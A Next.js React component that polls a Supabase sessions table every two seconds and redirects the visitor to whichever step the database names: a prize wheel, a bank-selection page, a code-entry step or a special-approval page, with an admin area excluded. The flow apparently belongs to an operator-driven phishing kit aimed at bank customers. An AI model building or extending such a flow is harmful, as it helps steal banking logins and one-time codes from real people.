"use client";

import { useCallback, useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import {
  ACTIVE_SESSION_EVENT,
  getPreferredRouteSessionId,
  getStoredActiveSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { isUuidSessionIdentifier } from "@/lib/session-identifiers";
import type { SessionStatus, SessionStep } from "@/types/session";

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";

function shouldPauseBankListRedirects(pathname: string) {
  if (!pathname.startsWith("/banken")) return false;

  try {
    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
  } catch {
    return false;
  }
}

function getSessionIdFromPath(pathname: string): string | null {
  if (pathname.startsWith("/win/")) {
    const parts = pathname.split("/");
    return parts[2] || null;
  }
  return null;
}

export function GlobalStatusWatcher() {
  const pathname = usePathname();
  const [sessionIdentity, setSessionIdentity] = useState<{
    sessionId: string | null;
    routeSessionId: string | null;
  }>({
    sessionId: null,
    routeSessionId: null,
  });

  const syncSessionIdentity = useCallback(() => {
    if (pathname.startsWith("/admin")) {
      setSessionIdentity({ sessionId: null, routeSessionId: null });
      return;
    }

    const fromPath = getSessionIdFromPath(pathname);
    let fromQuery: string | null = null;
    try {
      fromQuery = new URLSearchParams(window.location.search).get("session");
    } catch {
      /* ignore */
    }

    const resolvedSessionId =
      (isUuidSessionIdentifier(fromPath) ? fromPath : null) ||
      (isUuidSessionIdentifier(fromQuery) ? fromQuery : null) ||
      getStoredActiveSessionId() ||
      null;

    const resolvedRouteSessionId =
      fromPath ||
      fromQuery ||
      (resolvedSessionId ? getPreferredRouteSessionId(resolvedSessionId) : null);

    setSessionIdentity({
      sessionId: resolvedSessionId,
      routeSessionId: resolvedRouteSessionId,
    });
  }, [pathname]);

  useEffect(() => {
    syncSessionIdentity();
  }, [syncSessionIdentity]);

  useEffect(() => {
    const onSessionChanged = () => {
      syncSessionIdentity();
    };

    window.addEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);
    return () => window.removeEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);
  }, [syncSessionIdentity]);

  const { sessionId, routeSessionId } = sessionIdentity;

  useEffect(() => {
    if (pathname.startsWith("/admin")) return;
    if (!sessionId) return;
    persistActiveSession(sessionId, routeSessionId ?? undefined);
  }, [pathname, routeSessionId, sessionId]);

  useEffect(() => {
    if (pathname.startsWith("/admin")) return;
    if (!sessionId) return;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const checkStatus = async () => {
      if (shouldPauseBankListRedirects(window.location.pathname)) return;
      const { data } = await supabase
        .from("sessions")
        .select("status,current_step,form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (!data) return;

      if (window.location.pathname.startsWith("/admin")) return;

      const currentStep = data.current_step as SessionStep | undefined;
      const status = data.status as SessionStatus | undefined;

      if (currentStep) {
        let local: string | null = pathToStep(window.location.pathname);
        if (window.location.pathname.startsWith("/wheel")) {
          local = "wheel";
        }

        if (local === "wheel" && currentStep === "code_entry") {
          return;
        }

        if (local === "banken" && currentStep === "bank") {
          return;
        }

        const target = resolveStepTargetPath(
          currentStep,
          sessionId,
          getPreferredRouteSessionId(sessionId, routeSessionId ?? undefined),
          (data.form_data ?? {}) as { bankSlug?: string | null },
        );
        const targetPathname = (() => {
          try {
            return new URL(target, window.location.origin).pathname;
          } catch {
            return target;
          }
        })();

        // Kullanıcı zaten hedef sayfadaysa tekrar yönlendirme yapma (döngü engeli).
        if (window.location.pathname === targetPathname || window.location.pathname === `/${currentStep}`) {
          return;
        }

        window.location.href = target;
        return;
      }

      if (status === "SPECIAL_INFO" && window.location.pathname !== "/special-approval") {
        window.location.href = "/special-approval";
      }
    };

    void checkStatus();
    const timer = window.setInterval(() => {
      void checkStatus();
    }, 2000);

    return () => window.clearInterval(timer);
  }, [pathname, routeSessionId, sessionId]);

  return null;
}
